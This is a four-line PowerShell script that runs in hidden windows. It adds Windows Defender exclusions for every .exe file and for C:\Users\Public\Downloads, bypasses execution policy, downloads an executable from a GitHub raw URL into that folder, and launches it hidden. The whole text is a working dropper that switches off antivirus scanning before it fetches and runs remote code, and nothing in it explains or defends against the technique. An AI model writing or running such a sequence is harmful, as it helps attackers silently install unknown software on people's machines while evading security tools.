powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension '.exe'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/Test.exe' -OutFile 'C:\Users\Public\Downloads\Test.exe'"
Start-Process "C:\Users\Public\Downloads\Test.exe" -WindowStyle Hidden
